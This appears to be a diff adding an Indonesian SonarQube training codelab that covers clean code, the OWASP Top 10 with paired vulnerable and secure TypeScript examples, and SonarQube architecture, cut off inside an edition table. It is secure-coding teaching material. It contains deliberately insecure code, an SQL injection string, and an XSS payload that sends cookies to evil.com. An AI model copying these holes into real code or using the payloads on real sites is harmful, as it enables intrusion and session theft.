@@ -1,0 +1,2149 @@
+
+<!doctype html>
+
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="theme-color" content="#4F7DC9">
+  <meta charset="UTF-8">
+  <title>SonarQube Training Workshop</title>
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+  <style>
+    .success {
+      color: #1e8e3e;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+  <google-codelab codelab-gaid=""
+                  id="sonarqube-training"
+                  title="SonarQube Training Workshop"
+                  environment="web"
+                  feedback-link="https://github.com/your-repo/issues">
+    
+      <google-codelab-step label="Tentang Workshop Ini" duration="5">
+        <h2 is-upgraded>Selamat datang di SonarQube Training Workshop! 🎉</h2>
+<p>Dalam workshop ini, Anda akan mempelajari cara menggunakan <strong>SonarQube</strong> untuk meningkatkan kualitas kode dan keamanan aplikasi secara end-to-end.</p>
+<p class="image-container"><img alt="SonarQube Training Workshop" src="img\\f16cd9c562ddea8b.svg"></p>
+<h2 is-upgraded>Yang akan Anda pelajari</h2>
+<ul>
+<li>Memahami konsep Code Quality &amp; Secure Coding</li>
+<li>Arsitektur dan komponen SonarQube</li>
+<li>Instalasi &amp; konfigurasi SonarQube</li>
+<li>Menjalankan code scanning dan membaca hasilnya</li>
+<li>Memahami metrik &amp; dashboard SonarQube</li>
+<li>Membuat Quality Gate &amp; Quality Profile custom</li>
+<li>Integrasi SonarQube dengan CI/CD pipeline</li>
+<li>Security analysis &amp; vulnerability management</li>
+<li>Best practice refactoring &amp; code improvement</li>
+<li>Manajemen SonarQube untuk tim &amp; organisasi</li>
+</ul>
+<h2 is-upgraded>Prerequisites</h2>
+<p>Pastikan tools berikut sudah terinstall di laptop Anda <strong>sebelum workshop dimulai</strong>:</p>
+<ul>
+<li><strong>VS Code</strong> (versi terbaru)</li>
+<li><strong>Git</strong> (<a href="https://git-scm.com/downloads" target="_blank">download</a>)</li>
+<li><strong>Node.js 18+</strong> (<a href="https://nodejs.org/" target="_blank">download</a>) - untuk sample project TypeScript</li>
+<li><strong>npm</strong> (sudah include dengan Node.js)</li>
+<li>Akun <strong>GitHub</strong></li>
+<li>Koneksi internet stabil</li>
+</ul>
+<h2 is-upgraded>Yang Akan Kita Install Saat Workshop</h2>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Tool</p>
+</td><td colspan="1" rowspan="1"><p>Fungsi</p>
+</td><td colspan="1" rowspan="1"><p>Install Method</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarQube for IDE</strong></p>
+</td><td colspan="1" rowspan="1"><p>Real-time code analysis di VS Code (dulu bernama SonarLint)</p>
+</td><td colspan="1" rowspan="1"><p>VS Code Extension</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarScanner</strong></p>
+</td><td colspan="1" rowspan="1"><p>Scan project ke SonarQube server</p>
+</td><td colspan="1" rowspan="1"><p>npm install</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Akses SonarQube Server</h2>
+<p>SonarQube server sudah disiapkan. Anda tidak perlu install server sendiri - cukup scan dari laptop Anda.</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Info</p>
+</td><td colspan="1" rowspan="1"><p>Value</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>URL</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>http://sonar-training.duckdns.org</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Username</strong></p>
+</td><td colspan="1" rowspan="1"><p>akan diberikan saat workshop</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Password</strong></p>
+</td><td colspan="1" rowspan="1"><p>akan diberikan saat workshop</p>
+</td></tr>
+</table>
+<aside class="special"><p> Simpan URL dan credential di atas, Anda akan menggunakannya sepanjang workshop. Pastikan bisa mengakses URL tersebut dari browser Anda.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 1 - Apa itu Code Quality?" duration="15">
+        <h2 is-upgraded>Mengapa Kualitas Kode Penting?</h2>
+<p>Bayangkan Anda mewarisi sebuah project dari developer sebelumnya. Apa yang Anda harapkan?</p>
+<p><strong>Kode yang buruk = hutang teknis = waktu &amp; biaya lebih besar di masa depan.</strong></p>
+<h2 is-upgraded>Contoh: Kode Buruk vs Kode Baik</h2>
+<p>❌ <strong>Bad Code:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// Apa yang dilakukan fungsi ini?
+function proc(d: any, t: any) {
+  let r: any = [];
+  for (let i = 0; i &lt; d.length; i++) {
+    if (d[i].t == t) {
+      r.push(d[i]);
+    }
+  }
+  return r;
+}
+</code></pre>
+<p>✅ <strong>Clean Code:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">interface Product {
+  name: string;
+  type: string;
+  price: number;
+}
+
+function filterProductsByType(products: Product[], type: string): Product[] {
+  return products.filter(product =&gt; product.type === type);
+}
+</code></pre>
+<h2 is-upgraded>Perbedaan Utama</h2>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Aspek</p>
+</td><td colspan="1" rowspan="1"><p>Bad Code</p>
+</td><td colspan="1" rowspan="1"><p>Clean Code</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Nama variabel</p>
+</td><td colspan="1" rowspan="1"><p><code>d</code>, <code>t</code>, <code>r</code></p>
+</td><td colspan="1" rowspan="1"><p><code>products</code>, <code>type</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Type safety</p>
+</td><td colspan="1" rowspan="1"><p><code>any</code> everywhere</p>
+</td><td colspan="1" rowspan="1"><p>Interface yang jelas</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Readability</p>
+</td><td colspan="1" rowspan="1"><p>Harus tebak purpose</p>
+</td><td colspan="1" rowspan="1"><p>Self-documenting</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Maintainability</p>
+</td><td colspan="1" rowspan="1"><p>Sulit diubah</p>
+</td><td colspan="1" rowspan="1"><p>Mudah dipahami &amp; diubah</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Clean Code Principles</h2>
+<ol type="1">
+<li><strong>KISS</strong> - Keep It Simple, Stupid</li>
+<li><strong>DRY</strong> - Don&#39;t Repeat Yourself</li>
+<li><strong>SOLID</strong> - Single responsibility, Open/closed, Liskov substitution, Interface segregation, Dependency inversion</li>
+<li><strong>YAGNI</strong> - You Ain&#39;t Gonna Need It</li>
+</ol>
+<h2 is-upgraded>Technical Debt</h2>
+<p>Technical Debt adalah &#34;hutang&#34; yang terjadi ketika kita memilih solusi cepat (shortcut) daripada solusi yang benar.</p>
+<pre><code>Hutang Teknis = Waktu yang Dihemat Sekarang × Bunga (maintenance cost) di Masa Depan
+</code></pre>
+<p><strong>Contoh technical debt:</strong></p>
+<ul>
+<li>Hardcoded configuration</li>
+<li>Copy-paste code (duplikasi)</li>
+<li>Tidak ada unit test</li>
+<li>Skip code review</li>
+<li>Workaround tanpa dokumentasi</li>
+</ul>
+<aside class="warning"><p> Seperti hutang finansial, technical debt memiliki <strong>bunga</strong>. Semakin lama dibiarkan, semakin mahal biaya untuk membayarnya.</p>
+</aside>
+<h2 is-upgraded>Quiz: Identifikasi Bad Practice</h2>
+<p>Lihat kode berikut, ada berapa masalah yang bisa Anda temukan?</p>
+<pre><code language="language-typescript" class="language-typescript">const password = &#34;admin123&#34;; // TODO: ganti nanti
+
+function getUserData(id: any) {
+  let connection = mysql.createConnection({
+    host: &#34;localhost&#34;,
+    user: &#34;root&#34;, 
+    password: &#34;root123&#34;
+  });
+  
+  let query = &#34;SELECT * FROM users WHERE id = &#34; + id;
+  console.log(&#34;Running query: &#34; + query);
+  
+  try {
+    let result = connection.query(query);
+    return result;
+  } catch(e) {
+    // do nothing
+  }
+}
+</code></pre>
+<aside class="special"><p><strong>Jawaban:</strong> Minimal 6 masalah - hardcoded password, SQL injection, <code>any</code> type, console.log di production, empty catch block, koneksi tidak ditutup. Kita akan belajar mendeteksi semua ini secara otomatis dengan SonarQube!</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 1b - OWASP Top 10 &amp; Secure Coding" duration="15">
+        <h2 is-upgraded>OWASP Top 10 (2021)</h2>
+<p><strong>OWASP</strong> (Open Web Application Security Project) adalah komunitas non-profit yang fokus pada keamanan aplikasi web. Setiap beberapa tahun, mereka menerbitkan daftar <strong>10 risiko keamanan web paling kritis</strong> berdasarkan data nyata dari ribuan aplikasi di seluruh dunia.</p>
+<p>Daftar ini menjadi <strong>standar industri</strong> — banyak regulasi (PCI-DSS, ISO 27001) dan framework keamanan mengacu pada OWASP Top 10 sebagai baseline minimum yang harus dipenuhi.</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>#</p>
+</td><td colspan="1" rowspan="1"><p>Kategori</p>
+</td><td colspan="1" rowspan="1"><p>Singkat</p>
+</td><td colspan="1" rowspan="1"><p>Contoh Nyata</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A01</p>
+</td><td colspan="1" rowspan="1"><p><strong>Broken Access Control</strong></p>
+</td><td colspan="1" rowspan="1"><p>Kontrol akses tidak berfungsi</p>
+</td><td colspan="1" rowspan="1"><p>User biasa bisa akses endpoint <code>/admin</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A02</p>
+</td><td colspan="1" rowspan="1"><p><strong>Cryptographic Failures</strong></p>
+</td><td colspan="1" rowspan="1"><p>Enkripsi lemah atau tidak ada</p>
+</td><td colspan="1" rowspan="1"><p>Password disimpan plain text di database</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A03</p>
+</td><td colspan="1" rowspan="1"><p><strong>Injection</strong></p>
+</td><td colspan="1" rowspan="1"><p>Input berbahaya dieksekusi</p>
+</td><td colspan="1" rowspan="1"><p>SQL Injection, XSS, Command Injection</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A04</p>
+</td><td colspan="1" rowspan="1"><p><strong>Insecure Design</strong></p>
+</td><td colspan="1" rowspan="1"><p>Desain sistem tidak aman sejak awal</p>
+</td><td colspan="1" rowspan="1"><p>Tidak ada rate limiting di endpoint login</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A05</p>
+</td><td colspan="1" rowspan="1"><p><strong>Security Misconfiguration</strong></p>
+</td><td colspan="1" rowspan="1"><p>Konfigurasi default atau salah</p>
+</td><td colspan="1" rowspan="1"><p>Debug mode aktif di production, CORS terlalu permisif</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A06</p>
+</td><td colspan="1" rowspan="1"><p><strong>Vulnerable &amp; Outdated Components</strong></p>
+</td><td colspan="1" rowspan="1"><p>Library/framework usang dengan celah</p>
+</td><td colspan="1" rowspan="1"><p>Menggunakan library dengan CVE yang sudah dikenal</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A07</p>
+</td><td colspan="1" rowspan="1"><p><strong>Identification &amp; Auth Failures</strong></p>
+</td><td colspan="1" rowspan="1"><p>Autentikasi mudah dibobol</p>
+</td><td colspan="1" rowspan="1"><p>Tidak ada lockout setelah brute force</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A08</p>
+</td><td colspan="1" rowspan="1"><p><strong>Software &amp; Data Integrity Failures</strong></p>
+</td><td colspan="1" rowspan="1"><p>Update/data tidak diverifikasi</p>
+</td><td colspan="1" rowspan="1"><p>CI/CD pipeline mengeksekusi kode tanpa verifikasi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A09</p>
+</td><td colspan="1" rowspan="1"><p><strong>Security Logging &amp; Monitoring Failures</strong></p>
+</td><td colspan="1" rowspan="1"><p>Serangan tidak terdeteksi</p>
+</td><td colspan="1" rowspan="1"><p>Tidak ada audit log, alert tidak berfungsi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>A10</p>
+</td><td colspan="1" rowspan="1"><p><strong>Server-Side Request Forgery (SSRF)</strong></p>
+</td><td colspan="1" rowspan="1"><p>Server dimanipulasi untuk request internal</p>
+</td><td colspan="1" rowspan="1"><p>Fetch URL dari user input tanpa validasi</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Penjelasan Detail Tiap Kategori</h2>
+<h3 is-upgraded>A01: Broken Access Control</h3>
+<p>Pengguna bisa melakukan aksi di luar izin yang seharusnya diberikan kepada mereka.</p>
+<p>❌ <strong>Vulnerable:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// Endpoint mengembalikan data user berdasarkan ID dari URL
+// Tidak ada pengecekan apakah user yang login = pemilik data
+app.get(&#39;/api/users/:id/profile&#39;, async (req, res) =&gt; {
+  const user = await db.findUser(req.params.id);
+  res.json(user);
+});
+// User dengan id=1 bisa akses /api/users/2/profile → data orang lain!
+</code></pre>
+<p>✅ <strong>Secure:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">app.get(&#39;/api/users/:id/profile&#39;, authMiddleware, async (req, res) =&gt; {
+  // Pastikan yang request adalah pemilik data itu sendiri
+  if (req.user.id !== parseInt(req.params.id)) {
+    return res.status(403).json({ error: &#39;Forbidden&#39; });
+  }
+  const user = await db.findUser(req.params.id);
+  res.json(user);
+});
+</code></pre>
+<h3 is-upgraded>A02: Cryptographic Failures</h3>
+<p>Data sensitif tidak dilindungi dengan enkripsi yang memadai.</p>
+<p>❌ <strong>Vulnerable:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// Password disimpan plain text
+await db.query(&#39;INSERT INTO users (email, password) VALUES ($1, $2)&#39;, 
+  [email, password]  // ← plain text!
+);
+
+// Atau hash yang lemah
+import crypto from &#39;crypto&#39;;
+const hash = crypto.createHash(&#39;md5&#39;).update(password).digest(&#39;hex&#39;); // MD5 sudah tidak aman
+</code></pre>
+<p>✅ <strong>Secure:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">import bcrypt from &#39;bcrypt&#39;;
+
+const SALT_ROUNDS = 12;
+const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
+await db.query(&#39;INSERT INTO users (email, password) VALUES ($1, $2)&#39;, 
+  [email, hashedPassword]
+);
+</code></pre>
+<h3 is-upgraded>A03: Injection</h3>
+<p>Input dari user disisipkan ke query/perintah dan dieksekusi oleh sistem.</p>
+<p>❌ <strong>Vulnerable — SQL Injection:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">const query = `SELECT * FROM users WHERE email = &#39;${userInput}&#39;`;
+// Input: admin@test.com&#39; OR 1=1 --
+// Query jadi: SELECT * FROM users WHERE email = &#39;admin@test.com&#39; OR 1=1 --&#39;
+// → mengembalikan SEMUA user!
+</code></pre>
+<p>✅ <strong>Secure — Parameterized Query:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">const query = `SELECT * FROM users WHERE email = $1`;
+const result = await pool.query(query, [userInput]);
+// Parameter tidak pernah dieksekusi sebagai SQL
+</code></pre>
+<aside class="warning"><p> SQL Injection masuk kategori <strong>A03</strong> dan masih menjadi salah satu vulnerability paling sering ditemukan di aplikasi web. SonarQube dapat mendeteksi pola ini secara otomatis.</p>
+</aside>
+<h3 is-upgraded>A03: Injection — Cross-Site Scripting (XSS)</h3>
+<p>Script berbahaya disuntikkan ke halaman web dan dieksekusi di browser user lain.</p>
+<p>❌ <strong>Vulnerable:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">app.get(&#39;/search&#39;, (req, res) =&gt; {
+  res.send(`&lt;h1&gt;Hasil pencarian: ${req.query.q}&lt;/h1&gt;`);
+  // Input: &lt;script&gt;document.location=&#39;http://evil.com?c=&#39;+document.cookie&lt;/script&gt;
+  // → Cookie user dikirim ke server penyerang!
+});
+</code></pre>
+<p>✅ <strong>Secure:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">import { escape } from &#39;html-escaper&#39;;
+
+app.get(&#39;/search&#39;, (req, res) =&gt; {
+  const safeQuery = escape(req.query.q as string);
+  res.send(`&lt;h1&gt;Hasil pencarian: ${safeQuery}&lt;/h1&gt;`);
+  // &lt;script&gt; menjadi &amp;lt;script&amp;gt; → tidak dieksekusi browser
+});
+</code></pre>
+<h3 is-upgraded>A05: Security Misconfiguration</h3>
+<p>Sistem dikonfigurasi dengan cara yang tidak aman, seringkali karena menggunakan default.</p>
+<p>❌ <strong>Contoh konfigurasi berbahaya:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// CORS terlalu permisif — semua origin boleh akses
+app.use(cors({ origin: &#39;*&#39; }));
+
+// Error detail yang bocor ke client
+app.use((err, req, res, next) =&gt; {
+  res.status(500).json({ 
+    error: err.message,
+    stack: err.stack  // ← jangan tampilkan stack trace ke client!
+  });
+});
+
+// Debug mode aktif di production
+const app = express();
+app.set(&#39;env&#39;, &#39;development&#39;); // ← harus &#39;production&#39; di production
+</code></pre>
+<p>✅ <strong>Secure:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// CORS hanya izinkan domain yang diketahui
+app.use(cors({ origin: [&#39;https://myapp.com&#39;, &#39;https://admin.myapp.com&#39;] }));
+
+// Error handling tanpa detail internal
+app.use((err: Error, req: Request, res: Response, next: NextFunction) =&gt; {
+  console.error(err); // log detail di server saja
+  res.status(500).json({ error: &#39;Internal server error&#39; }); // generic message ke client
+});
+</code></pre>
+<h3 is-upgraded>A06: Vulnerable &amp; Outdated Components</h3>
+<p>Menggunakan library atau framework yang sudah memiliki celah keamanan yang diketahui publik (CVE).</p>
+<pre><code language="language-bash" class="language-bash"># Cek vulnerability di dependencies project Node.js
+npm audit
+
+# Output contoh:
+# 3 vulnerabilities (1 moderate, 2 high)
+# 
+# high severity vulnerability
+# Package: lodash
+# Dependency of: your-project
+# Path: lodash
+# More info: https://npmjs.com/advisories/1523
+</code></pre>
+<p><strong>Best practice:</strong></p>
+<ul>
+<li>Jalankan <code>npm audit</code> secara rutin (atau integrasikan ke CI/CD)</li>
+<li>Update dependency secara berkala</li>
+<li>Gunakan tools seperti <strong>Dependabot</strong> (GitHub) untuk update otomatis</li>
+</ul>
+<h3 is-upgraded>A07: Identification &amp; Authentication Failures</h3>
+<p>Mekanisme autentikasi yang lemah memungkinkan attacker mengambil alih akun.</p>
+<p>❌ <strong>Vulnerable:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">// Tidak ada rate limiting → rentan brute force
+app.post(&#39;/login&#39;, async (req, res) =&gt; {
+  const user = await db.findByEmail(req.body.email);
+  if (user &amp;&amp; user.password === req.body.password) { // plain text comparison!
+    res.json({ token: generateToken(user) });
+  } else {
+    res.status(401).json({ error: &#39;Invalid credentials&#39; });
+    // Tidak ada hitungan percobaan gagal
+  }
+});
+</code></pre>
+<p>✅ <strong>Secure:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">import rateLimit from &#39;express-rate-limit&#39;;
+import bcrypt from &#39;bcrypt&#39;;
+
+// Maksimal 5 percobaan login per 15 menit per IP
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  message: &#39;Too many login attempts, please try again later&#39;
+});
+
+app.post(&#39;/login&#39;, loginLimiter, async (req, res) =&gt; {
+  const user = await db.findByEmail(req.body.email);
+  const valid = user &amp;&amp; await bcrypt.compare(req.body.password, user.password);
+  if (valid) {
+    res.json({ token: generateToken(user) });
+  } else {
+    res.status(401).json({ error: &#39;Invalid credentials&#39; });
+  }
+});
+</code></pre>
+<h3 is-upgraded>A09: Security Logging &amp; Monitoring Failures</h3>
+<p>Kejadian keamanan (login gagal, akses ditolak, error) tidak dicatat atau tidak dipantau.</p>
+<p>❌ <strong>Vulnerable:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">app.post(&#39;/login&#39;, async (req, res) =&gt; {
+  try {
+    const user = await authenticate(req.body);
+    res.json({ token: generateToken(user) });
+  } catch (err) {
+    // Tidak ada log → serangan brute force tidak terdeteksi
+    res.status(401).json({ error: &#39;Invalid credentials&#39; });
+  }
+});
+</code></pre>
+<p>✅ <strong>Secure:</strong></p>
+<pre><code language="language-typescript" class="language-typescript">import logger from &#39;./logger&#39;; // winston, pino, dll
+
+app.post(&#39;/login&#39;, async (req, res) =&gt; {
+  try {
+    const user = await authenticate(req.body);
+    logger.info(&#39;Login success&#39;, { userId: user.id, ip: req.ip });
+    res.json({ token: generateToken(user) });
+  } catch (err) {
+    logger.warn(&#39;Login failed&#39;, { 
+      email: req.body.email, 
+      ip: req.ip, 
+      userAgent: req.headers[&#39;user-agent&#39;]
+    });
+    res.status(401).json({ error: &#39;Invalid credentials&#39; });
+  }
+});
+</code></pre>
+<h2 is-upgraded>Secure Coding Mindset</h2>
+<p>Menghindari OWASP Top 10 bukan sekadar hafal daftarnya — perlu <strong>pola pikir</strong> yang berbeda saat menulis kode:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Prinsip</p>
+</td><td colspan="1" rowspan="1"><p>Penjelasan</p>
+</td><td colspan="1" rowspan="1"><p>Contoh Penerapan</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Never trust user input</strong></p>
+</td><td colspan="1" rowspan="1"><p>Semua input dari luar sistem dianggap berbahaya</p>
+</td><td colspan="1" rowspan="1"><p>Validasi &amp; sanitize sebelum diproses</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Principle of Least Privilege</strong></p>
+</td><td colspan="1" rowspan="1"><p>Berikan akses minimum yang diperlukan</p>
+</td><td colspan="1" rowspan="1"><p>API key hanya read, bukan read+write</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Defense in Depth</strong></p>
+</td><td colspan="1" rowspan="1"><p>Jangan andalkan satu layer keamanan saja</p>
+</td><td colspan="1" rowspan="1"><p>Validasi di frontend DAN backend</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Fail Secure</strong></p>
+</td><td colspan="1" rowspan="1"><p>Saat error, jatuh ke kondisi yang aman</p>
+</td><td colspan="1" rowspan="1"><p>Deny by default jika otorisasi gagal</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Keep it Simple</strong></p>
+</td><td colspan="1" rowspan="1"><p>Kompleksitas adalah musuh keamanan</p>
+</td><td colspan="1" rowspan="1"><p>Hindari logika otorisasi yang rumit</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Security by Design</strong></p>
+</td><td colspan="1" rowspan="1"><p>Keamanan dipikirkan sejak awal, bukan ditambahkan belakangan</p>
+</td><td colspan="1" rowspan="1"><p>Threat modeling saat desain fitur</p>
+</td></tr>
+</table>
+<aside class="special"><p> SonarQube dapat mendeteksi banyak vulnerability OWASP secara otomatis — terutama A03 (Injection), A02 (Cryptographic Failures), A07 (Hardcoded credentials), dan A05 (Security Misconfiguration). Kita akan melihat ini langsung di Modul 4 &amp; 8.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 2 - Arsitektur &amp; Komponen SonarQube" duration="10">
+        <h2 is-upgraded>Apa itu SonarQube?</h2>
+<p><strong>SonarQube</strong> adalah platform open-source untuk <strong>continuous inspection</strong> kualitas kode. SonarQube melakukan analisis statis (SAST) untuk mendeteksi:</p>
+<ul>
+<li>🐛 <strong>Bugs</strong> - kode yang berpotensi error</li>
+<li>🔓 <strong>Vulnerabilities</strong> - celah keamanan</li>
+<li>😤 <strong>Code Smells</strong> - kode yang sulit di-maintain</li>
+<li>📋 <strong>Duplications</strong> - kode yang di-copy-paste</li>
+<li>📊 <strong>Coverage</strong> - persentase kode yang ditest</li>
+</ul>
+<h2 is-upgraded>Arsitektur SonarQube</h2>
+<p class="image-container"><img alt="Arsitektur SonarQube" src="img\\9bc74246a15c560a.png"></p>
+<h2 is-upgraded>Komponen Utama</h2>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Komponen</p>
+</td><td colspan="1" rowspan="1"><p>Fungsi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarQube Server</strong></p>
+</td><td colspan="1" rowspan="1"><p>Web UI, API, processing results</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Compute Engine</strong></p>
+</td><td colspan="1" rowspan="1"><p>Menganalisis kode dan menyimpan hasil</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Search Server</strong></p>
+</td><td colspan="1" rowspan="1"><p>Elasticsearch - untuk pencarian di UI</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Database</strong></p>
+</td><td colspan="1" rowspan="1"><p>Menyimpan konfigurasi, hasil scan, metrik</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarScanner</strong></p>
+</td><td colspan="1" rowspan="1"><p>Tool di sisi client untuk mengirim kode ke server</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarQube for IDE</strong></p>
+</td><td colspan="1" rowspan="1"><p>Plugin IDE untuk real-time feedback (dulu SonarLint)</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Flow: Scan → Analyze → Report</h2>
+<p class="image-container"><img alt="Flow Scan Analyze Report" src="img\\eefc01b2f6cb017c.png"></p>
+<h2 is-upgraded>Quality Profile vs Quality Gate</h2>
+<table>
+<tr><td colspan="1" rowspan="1"></td><td colspan="1" rowspan="1"><p>Quality Profile</p>
+</td><td colspan="1" rowspan="1"><p>Quality Gate</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Apa</strong></p>
+</td><td colspan="1" rowspan="1"><p>Kumpulan <strong>rules</strong> yang digunakan saat scan</p>
+</td><td colspan="1" rowspan="1"><p>Kumpulan <strong>threshold/kondisi</strong> untuk pass/fail</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Contoh</strong></p>
+</td><td colspan="1" rowspan="1"><p>&#34;Sonar Way&#34; = 500+ rules aktif</p>
+</td><td colspan="1" rowspan="1"><p>Coverage ≥ 80%, 0 new bugs, 0 new vulnerabilities</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Analogi</strong></p>
+</td><td colspan="1" rowspan="1"><p>Daftar ujian yang harus diambil</p>
+</td><td colspan="1" rowspan="1"><p>Nilai minimum untuk lulus</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Kapan</strong></p>
+</td><td colspan="1" rowspan="1"><p>Saat scanning</p>
+</td><td colspan="1" rowspan="1"><p>Setelah scanning selesai</p>
+</td></tr>
+</table>
+<h2 is-upgraded>Perbandingan Edisi SonarQube</h2>
+<p>SonarQube tersedia dalam <strong>4 edisi</strong>. Memahami perbedaannya penting untuk memilih yang sesuai kebutuhan organisasi.</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Fitur</p>
+</td><td colspan="1" rowspan="1"><p>Community (Gratis)</p>
+</td><td colspan="1" rowspan="1"><p>Developer</p>
+</td><td colspan="1" rowspan="1"><p>Enterprise</p>
+</td><td colspan="1" rowspan="1"><p>Data Center</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Harga</strong></p>
+</td><td colspan="1" rowspan="1"><p>Gratis / Open Source</p>
+</td><td colspan="1" rowspan="1"><p>Berbayar</p>
+</td><td colspan="1" rowspan="1"><p>Berbayar</p>
+</td><td colspan="1" rowspan="1"><p>Berbayar</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Bahasa dasar</strong> (Java, JS/TS, Python, C#, Go, PHP, dll)</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Bahasa tambahan</strong> (C, C++, Objective-C, Swift, ABAP, PL/SQL)</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Branch Analysis</strong> (scan selain main branch)</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>PR Decoration</strong> (komentar otomatis di Pull Request)</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Taint Analysis</strong> (deteksi data flow vulnerability)</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarQube for IDE Connected Mode</strong></p>
+</td><td colspan="1" rowspan="1"><p>Partial</p>
+</td><td colspan="1" rowspan="1"><p>✅ Full</p>
+</td><td colspan="1" rowspan="1"><p>✅ Full</p>
+</td><td colspan="1" rowspan="1"><p>✅ Full</p>
+</td></tr>
